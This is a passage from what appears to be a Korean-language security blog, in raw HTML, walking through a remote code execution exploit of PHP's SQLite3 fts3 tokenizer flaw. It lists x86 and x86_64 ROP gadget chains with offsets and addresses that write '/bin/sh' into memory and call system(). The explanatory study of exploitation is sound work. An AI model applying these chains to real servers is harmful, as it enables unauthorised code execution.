변경하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"wasm\"><pre class=\"language-wasm\"><code class=\"language-wasm\">xchg esp, eax;\nret;</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABF0lEQVQY01WQaU/CQBCGl0PkqCBqactRoeVubRHlKAQolpZYqIox4v//I6/ZMYT4YbKZ2Z1nnln2NHLRMyeoqn00dBuS0kbi4gZZQaaapLQQS1yjUKyhdm9AlJtg8QLuShrUuglR0imPJ4sUbBMcqJjJyQijI9yXCJeZEqRyG7u3HzjzgBr01iPC/RGD4RKMCTDtGfztAdZgDsauzkDXi8hKyFewWIWYznyksxJKchOe/46xsyFDbr8Nv2APF2AsB8Ny4G8/0e4+/wd6wQfK1S4BX/ffWLo7pNIilEqHjMdTj4Bq44HsOYgb9owJVus9Ov0RWCx/BmpNm9blEN7E4X9/qKCuWbT66XEydUt3fAA/efA6z0/AXze9iQhuLwfFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/f542ba31671d5ad8462ff0a5e69c49ca/37523/13.png\"\n        srcset=\"/static/f542ba31671d5ad8462ff0a5e69c49ca/e9ff0/13.png 180w,\n/static/f542ba31671d5ad8462ff0a5e69c49ca/f21e7/13.png 360w,\n/static/f542ba31671d5ad8462ff0a5e69c49ca/37523/13.png 720w,\n/static/f542ba31671d5ad8462ff0a5e69c49ca/7de01/13.png 794w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"rop-기법을-활용하여-rce-취약점-수행\" style=\"position:relative;\"><a href=\"#rop-%EA%B8%B0%EB%B2%95%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%88%98%ED%96%89\" aria-label=\"rop 기법을 활용하여 rce 취약점 수행 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP 기법을 활용하여 RCE 취약점 수행</h3>\n<ul>\n<li>앞서 취약점 활용하여 원하는 가젯들을 체인할 수 있는 벡터를 마련하였습니다.</li>\n<li>중요한 사실은 RCE를 발생하기 위해서 “/bin/sh” 명령을 내리기 위해 문자열이 있는 메모리 공간이 있어야 합니다.</li>\n<li>읽기/쓰기 가 가능한 메모리 영역으로 문자열을 쓰기 위해 하드 코딩으로 문자열을 4바이트씩 끊어 가면서 메모리 상에 쓰고 마지막에 널 바이트를 추가합니다.</li>\n<li>시스템 라이브러리 함수를 호출할 때 해당 문자열의 포인터 주소를 불러와서 호출을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"wasm\"><pre class=\"language-wasm\"><code class=\"language-wasm\">## command move step <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>~<span class=\"token number\">5</span> repeat<span class=\"token punctuation\">)</span>\npop eax ; ret               --------> libsqlite3_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x00305337</span><span class=\"token punctuation\">)</span> -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x82337</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xe9c337</span><span class=\"token punctuation\">)</span>\n;command<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>                 --------> CMD\npop edx ; ret               --------> libsqlite3_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x00305e09</span><span class=\"token punctuation\">)</span> -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x82e09</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xe9ce09</span><span class=\"token punctuation\">)</span>\n;writable <span class=\"token keyword\">memory</span>            --------> libsqlite3+<span class=\"token punctuation\">(</span><span class=\"token number\">0x8eaa0</span><span class=\"token number\">-0x18</span><span class=\"token punctuation\">)</span>                         -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xea8a88</span>, <span class=\"token number\">0xea8a8c</span>, <span class=\"token number\">0xea8a90</span>, <span class=\"token number\">0xea8a94</span>, <span class=\"token number\">0xea8a98</span>,<span class=\"token number\">0xea8a9c</span>, <span class=\"token number\">0xea8aa0</span><span class=\"token punctuation\">)</span>\nmov [edx<span class=\"token number\">+0x18</span>], eax ; ret   --------> libc-2_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x004e3642</span><span class=\"token punctuation\">)</span>     -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x2a642</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0d642</span><span class=\"token punctuation\">)</span>\n\n## <span class=\"token keyword\">call</span> system\npop eax ; ret               --------> libsqlite3_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x00305337</span><span class=\"token punctuation\">)</span> -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x82337</span><span class=\"token punctuation\">)</span>     -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xe9c337</span><span class=\"token punctuation\">)</span>\n;lib_system                 --------> libc<span class=\"token number\">-2</span><span class=\"token number\">+0x3af60</span>                                       -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xa1df60</span><span class=\"token punctuation\">)</span>\npop esi ; ret               --------> libphp5_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x000d5902</span><span class=\"token punctuation\">)</span>    -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x000d5902</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xb71a8902</span><span class=\"token punctuation\">)</span>\n;writable <span class=\"token keyword\">memory</span>            --------> libsqlite3<span class=\"token number\">+0x8eaa0</span>                                   -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xea8aa0</span><span class=\"token punctuation\">)</span>\npush esi ; <span class=\"token keyword\">call</span> eax;        --------> libphp5_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x0029eb07</span><span class=\"token punctuation\">)</span>    -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x0029eb07</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xb7371b07</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>해당 가젯들은 노출된 메모리 주소에서 offset 계산을 통해 가젯을 선정한 후 쓰기 가 가능한 공간으로 <code class=\"language-text\">libcsqlite3</code> .bss 섹션을 활용합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/ElEQVQY01WQSU/CYBRFP8HZhUOiCwIqKlBKoS0dgTKUwVKQAgJGMSb+/z9xTL+di7N4ycu5N1c43pCK6qCbXbzWGL89ofBQkyxWewajBZnDa1TNJ1ntMaweB9kr2kHEevPDfVHj+PSWcJwwne0QptWjWnPRzQDLDSUNM+CpZBDFG7r9GdmjGxTVJZ7vaBiBDHD9MfPkk8KjxsnZHeEoIYq3iKbdl8+p0HZDSV3v8Fw2Wa6/GQwXCHFBperIRqlQiHP8zivbj19y+Soic8kkeudt+YWwveE/oeUM0JtdcnmF4osup1DkJAGliiXbp3cqLis2daODqnnU6i3JH5h2f2FmvciIAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/0c5aaf84765af8a9c30679d4c05294dd/37523/14.png\"\n        srcset=\"/static/0c5aaf84765af8a9c30679d4c05294dd/e9ff0/14.png 180w,\n/static/0c5aaf84765af8a9c30679d4c05294dd/f21e7/14.png 360w,\n/static/0c5aaf84765af8a9c30679d4c05294dd/37523/14.png 720w,\n/static/0c5aaf84765af8a9c30679d4c05294dd/715a3/14.png 830w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">edx</code> 레지스터에 대입된 <code class=\"language-text\">sqlite3SavedPrng</code> 주소 +0x18 번지로 역참조된 값에 하드 코딩된 값을 집어넣었습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABsElEQVQozzVRa3OaUBC9aZq2aSoBY2ulxGiiCEbEIKCCNqLGV0TGaGKtfXzo9P//hNPZdfqBWe7uztnzELV6B+3gAfZdD64foelH0A0Xnz6X8CVfRUl3ULyxcVO+gyRf4vQsi+tSA7rR5NlV0cKr1wqOjmWuouH0EPamKFcctMMx/PYQQXeCiumhVg8wX7xgOt8gTr4jX7SQkjWMp2vEyY5799ECxydpBmNA89ZH0+szCwKvN0I47j1004VR9TGZbTAYJVxVzcSbdx8Z5GHyxH1SJUQK4kg6ANbsAN2vM6bvtYZw3D6zpD5Jc7w+ouESy9Uelh3yYbKFVDzGW56plybkdJ5lC2IXjZaoVD10wjF/QW8KrzXAuZKHEO/R6oywfv6N1eYXtrs/3M/mdH6v1j+x2//lfWZK8uiKQYDdCQNSSLSgXFyxFGKcrPZ4jL9xVS4KyGkGe7hY7pA8/WC7GPDWOqRMKRJbGtAR+pdkjZfoPVu8cBjzeMvysrkyh0XeknTLDiCEdAiFQMlD1x+gcF2HqhlQMgWcpVRO8IOkIp0pMGOqJ28zHA4x/d+jXfLwH6xn97mP1bOQAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"asd.png\"\n        title=\"asd.png\"\n        src=\"/static/004ea3989fb2f251c19019243f3e9b52/37523/asd.png\"\n        srcset=\"/static/004ea3989fb2f251c19019243f3e9b52/e9ff0/asd.png 180w,\n/static/004ea3989fb2f251c19019243f3e9b52/f21e7/asd.png 360w,\n/static/004ea3989fb2f251c19019243f3e9b52/37523/asd.png 720w,\n/static/004ea3989fb2f251c19019243f3e9b52/5a6dd/asd.png 802w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 639px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 51.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABeElEQVQoz42SWXOCQBCEUWO8oiIKiOKNFx4cCqKo8Uoqlcr//zudmjHxQS2Th66dpXa/7ZlGqDVGMMcBxtYKU2cNvW5CklvIZDVo1T6iTwVWJCZe6kcSnpMyJtYKc38Pb3GArHYwsUOIUh1tw2aQEMlfoH+BhXiiBH95wmb3idf9Fyr6kB0X5Tb6Q49dJlIyBCF7gT2CMpAu2u4WUztEodiE0XMZPLXXCFZvMHoOkmkVsbj0H4dF2O4GXnDklpWyAW9x5EeC8B3h5gOWuwHNOpVRb4DXe57hfHHAYnmC6+1QrvR4djRLPzjBD45wZlv0TQ90lloXIrmzorezFZrtKcxJwA5yoo5MtoJ0VkP6ReNgSkqHXZMKxcbPtzbXybRy65DaJXczb4eB6UHTBxeXBKEHcmINUqnFQeULZyDVqUz5FjiaLHnwlrPGwPTZqap1WRV9wP8jBcIt/rZLK+ley5QoQQlAjmilg3SB6mptCKXc5YTvpXrt8Butyv1aAcVepwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/96c1b55ba8a6a3f9c6e2e70aa1721161/738b8/15.png\"\n        srcset=\"/static/96c1b55ba8a6a3f9c6e2e70aa1721161/e9ff0/15.png 180w,\n/static/96c1b55ba8a6a3f9c6e2e70aa1721161/f21e7/15.png 360w,\n/static/96c1b55ba8a6a3f9c6e2e70aa1721161/738b8/15.png 639w\"\n        sizes=\"(max-width: 639px) 100vw, 639px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>가젯 들이 동작을 하면서 마지막으로 시스템 라이브러를 호출하여 Code Execution을 수행합니다.</li>\n</ul>\n<h1 id=\"x86_64bit-환경-php-sqlite3-fts3-tokenizer-rce-취약점\" style=\"position:relative;\"><a href=\"#x86_64bit-%ED%99%98%EA%B2%BD-php-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"x86_64bit 환경 php sqlite3 fts3 tokenizer rce 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>x86_64bit 환경 PHP SQLite3 fts3 tokenizer RCE 취약점</h1>\n<ul>\n<li>앞서 x86 환경에서의 공통된 취약점을 이용하며 새로운 가젯을 사용해 xCreate의 콜백 함수를 조절해서 원하는 페이로드를 실행하여 RCE를 수행해봅시다.</li>\n</ul>\n<h3 id=\"rop를-활용해서-시스템-라이브러리-함수-호출-진행\" style=\"position:relative;\"><a href=\"#rop%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%B4%EC%84%9C-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C-%EC%A7%84%ED%96%89\" aria-label=\"rop를 활용해서 시스템 라이브러리 함수 호출 진행 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP를 활용해서 시스템 라이브러리 함수 호출 진행</h3>\n<ul>\n<li>64bit 환경은 32bit 환경과 다르게 레지스터를 활용해서 인자를 주고 받기 때문에 ROP 구조를 새로 구성합니다.</li>\n<li><code class=\"language-text\">[libphp5.so](http://libphp5.so)</code> 공유 라이브러리 안에 실행 권한이 있는 부분의 가젯들을 이용해서 ROP Chain을 설계 해봅시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">leave<span class=\"token punctuation\">;</span>                     <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">stack</span> pivot\nret<span class=\"token punctuation\">;</span>                       <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">payload</span><span class=\"token operator\">-></span><span class=\"token property\">esp</span>\n\npop rax<span class=\"token punctuation\">;</span>                   <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">rax</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> system_lib\npop rbx<span class=\"token punctuation\">;</span>                   <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">rbx</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> wirtable <span class=\"token function\">memory</span><span class=\"token punctuation\">(</span>Cookie_path<span class=\"token punctuation\">)</span>\nret<span class=\"token punctuation\">;</span>\n\nmov rdi<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>rbx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>            <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">rdi</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> <span class=\"token punctuation\">[</span>rbx<span class=\"token punctuation\">]</span> <span class=\"token function\">address</span><span class=\"token punctuation\">(</span>writalbe memory<span class=\"token punctuation\">)</span>\ncall rax<span class=\"token punctuation\">;</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA3ElEQVQY022QaQuCQBCGzSxLzQPL1qwktYMOy+iQLiio//+P3pipKMgPLzuzMM8+s1KrHWO1vmCzu6IXzlDT2gijFJrhc+q6QEVtQqm6nE8tKw5KZZvP30gESLMT8sMd8TCD3uggGa25jpIVwsECpt2FJFswzACOG4Ik1LoHSS4AksUyOyM/PhhEvScSTOc5h2oaJht6XG/4DFZUt9hQM8QL+DakFQkyme6w2d8wiJdsSMOW00dLJBDBmOFk/QckwDw9YLu/8XrUE8QPxrxa04v47mvYgWn3+C+LDJ+LM32NwjeMOAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/a71eafd63c47699567611c2dc9fba1ec/37523/16.png\"\n        srcset=\"/static/a71eafd63c47699567611c2dc9fba1ec/e9ff0/16.png 180w,\n/static/a71eafd63c47699567611c2dc9fba1ec/f21e7/16.png 360w,\n/static/a71eafd63c47699567611c2dc9fba1ec/37523/16.png 720w,\n/static/a71eafd63c47699567611c2dc9fba1ec/024d6/16.png 961w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Stack Pivot 가젯을 이용해서 <code class=\"language-text\">ps_globals</code> 구조체의 주소 값을 스택 메모리 상으로 변경하여 ps_globals에 저장되어 있는 필드들을 확인할 수 가 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABZklEQVQoz3WRa0sCURCGj1oRkZmmqOtdS1td9+Kqu7quq+s188aKJSEI/f//8MYZ8INFHw4Mh+GZZ95hYq0NSe5C0XoQawYkuYOEUIGQfkW+KKMsNpFMVRAMpRCLlxCJFhB+yiNwHYEv8Aj/VfjiMbVho22Ooel96K0BmoaLXFFGtzeDZc/huEsCCRkRk5kH21nAtKa4uY39A9T7aJsjKA0bstojaFUy4AyXGE23mMw9xJNlJIQyVpsvuOMNOtaUYMwXIgivz3AmqxYaTQd1xaK1taaDithCLP4MRbOxXB9gdifgfZlcDb3+Gw3iwyPRPJg/dGnIYS3DJUO+Nq95pozdIZ2tYusdsdufaF1uwc033hEfh2+8VHQwdn8JrKsW1EYfVckkC56pKBk0OZuXCMQhXXtGufH8pvMd5os9HY2x4G/DAWV4PgqvOZT5HlAoKWTzvvrEcLwm4MBd0Z+3P6FU1v4Y/gAHWs8nUgHCoAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/5442c0b2654c4bd8a7d96d1b3fe4237c/37523/17.png\"\n        srcset=\"/static/5442c0b2654c4bd8a7d96d1b3fe4237c/e9ff0/17.png 180w,\n/static/5442c0b2654c4bd8a7d96d1b3fe4237c/f21e7/17.png 360w,\n/static/5442c0b2654c4bd8a7d96d1b3fe4237c/37523/17.png 720w,\n/static/5442c0b2654c4bd8a7d96d1b3fe4237c/a0b80/17.png 955w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>시스템 라이브러리 함수를 호출하기 위해서 스택상에 있는 시스템 라이브러리를 rax 레지스터가 가리키는 형태로 진행 하였습니다.</li>\n<li>후, rbx 레지스터를 이용해서 Cookie_path 필드에 삽입한 문자열을 가리키는 주소를 대입합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9klEQVQY04WRa1OCQBSGV+1muFwsaAMk0kpBQsQNJJTsMtX//0Nvs2caPjn64Z2deefMs8/ZZbncIc02kMU7kvQVjHFww4Nu+tC4C43fUtfpmZTuidWe+8Kesxpl9YWq/ka1+aFh4T5hFhewrkIEYYK+JtA7HR6FETBOSqxedsjlG5K0otK+mcAPYozu5qibX2T5luwHugvWNY4B1wRTWSy3ZOCIB9xPFvBGEYr1J9SMMj27sME6emu6z5ZF/4Yqy1XTAsNxCuFNIcsPehJ1oTI/79uHDaeRxGxeIMsbWkuV186YDB3xSGBzGIAbPgwrwOVAHPyUPw09mgtiwo4CAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/890cf5761cf6bfb3256b501faa2bc1c6/37523/18.png\"\n        srcset=\"/static/890cf5761cf6bfb3256b501faa2bc1c6/e9ff0/18.png 180w,\n/static/890cf5761cf6bfb3256b501faa2bc1c6/f21e7/18.png 360w,\n/static/890cf5761cf6bfb3256b501faa2bc1c6/37523/18.png 720w,\n/static/890cf5761cf6bfb3256b501faa2bc1c6/62de4/18.png 746w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">ps_globals</code> cookie_path 필드는 삽입한 페이로드를 가리키는 포인터이기 때문에 rbx 레지스터에 대입을 한 후 참조하는 과정이 필요합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token number\">0x7ff9d4cefbc0</span> <span class=\"token operator\">&lt;</span>ps_globals<span class=\"token operator\">+</span><span class=\"token number\">64</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span>  <span class=\"token operator\">=></span> <span class=\"token number\">0x00007ff9d8b15908</span>\n\n<span class=\"token number\">0x00007ff9d8b15908</span> <span class=\"token operator\">=></span>  <span class=\"token string double-quoted-string\">\"/bin/sh\"</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjElEQVQI112ObwuCMBjEV5qE2dga/RuFWdKb0E2tIFhR3/9DXTyDifjixz3cwx3HbtULdeNQW4c02yOZr8HFERnX2OxKSHXy3iQSmMYS0WzlNdxE+BHMNA735w+mffvwYqlxLi2Ki4FtP9jqK+JE9SHSMUOf0bLu8e0LaWVeVODiAKlyXxYCYcWY4cI/TMBJZVzFvA4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/72796d74fdfa4002b09dd9c30cdc6621/37523/19.png\"\n        srcset=\"/static/72796d74fdfa4002b09dd9c30cdc6621/e9ff0/19.png 180w,\n/static/72796d74fdfa4002b09dd9c30cdc6621/f21e7/19.png 360w,\n/static/72796d74fdfa4002b09dd9c30cdc6621/37523/19.png 720w,\n/static/72796d74fdfa4002b09dd9c30cdc6621/ddc81/19.png 837w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>rbx 레지스터를 참조한 값을 호출 규약에 맞게 rdi 레지스터에 mov 명령을 통해 대입한 후 code execution을 실행합니다.</li>\n</ul>\n<h1 id=\"참조\" style=\"position:relative;\"><a href=\"#%EC%B0%B8%EC%A1%B0\" aria-label=\"참조 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 